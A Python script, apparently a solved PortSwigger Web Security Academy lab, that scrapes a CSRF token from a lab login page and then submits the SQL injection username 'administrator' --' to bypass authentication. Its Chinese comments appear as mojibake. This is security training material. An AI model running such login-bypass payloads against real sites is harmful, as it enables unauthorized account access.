# é€™ä¸€ç‰ˆæ˜¯è‡ªå·±æ‰“çš„ç‰ˆæœ¬
# å¯¦æ¸¬éä¹Ÿå¯é€šé—œ
import requests
from typing import Optional, Any

BASE_URL = "https://0ae3000f03865088808399f3008e0077.web-security-academy.net/login";
session= requests.session();

def send_get_request(url: str, params: Optional[dict[str, Any]]=None, timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def send_post_request(url:str, data: dict[str,any], timeout:int=10) ->Optional[requests.Response]:
    try:
        # å› ç‚ºç”¨Content-Type application/x-www-form-urlencodedå‚³è¼¸æ‰€ä»¥dataé€post
        # å¦‚æœç”¨jsonæœƒå¤±æ•—
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

"""
ğŸ”¹ ä½ çš„ç¨‹å¼æƒ…å¢ƒ
ä½ çš„ get_csrf_token() å…¶å¯¦æ˜¯ï¼š
å‘¼å« send_get_request(BASE_URL) â†’ æœ‰ç¶²è·¯è«‹æ±‚
ç”¨ BeautifulSoup parse HTML
å¾ <input> æŠ“ token
ğŸ‘‰ é€™ä¸æ˜¯ã€Œå–®ç´”å–å€¼ã€ï¼Œè€Œæ˜¯ã€Œå»ä¼ºæœå™¨æŠ“è³‡æ–™ã€ã€‚
âœ… å»ºè­°å‘½å
ç”¨ fetch_csrf_token() æœƒæ›´æ¸…æ¥šï¼Œå› ç‚ºå®ƒçœŸçš„æœƒã€Œfetch é ç«¯è³‡æºã€ã€‚
å¦‚æœå°‡ä¾†ä½ æƒ³è¦ã€Œæœ‰å¿«å–ç‰ˆæœ¬ã€çš„è©±ï¼Œä¹Ÿå¯ä»¥è¨­è¨ˆæˆï¼š
"""
def fetch_csrf_token() -> Optional[str]:
    try:
        response = send_get_request(BASE_URL) 
        if response and response.status_code ==200:
            print("url 200")
            #print(response.text)
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find("input",{"name":"csrf"})
            if csrf_input and csrf_input.get("value"):
                return csrf_input.get("value")
        else:
            print("csrf token get failed")
            return None;
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def main():
    
    # å…ˆå–å¾—csrf
    csrf_token = fetch_csrf_token()
    if csrf_token:
        print(f"csrf:{csrf_token}")
    else:
        return

    # åˆ¶å®špayload
    payload = {
        "csrf": csrf_token,
        "username":"administrator' --",
        "password":"aa"
    }

    # sqli
    response = send_post_request(BASE_URL, payload)
    if response and response.status_code == 200:
        print(response.text)
    else:
        print(f"sqli failed, status_code:{response.status_code}")


if __name__ == "__main__":
    main();

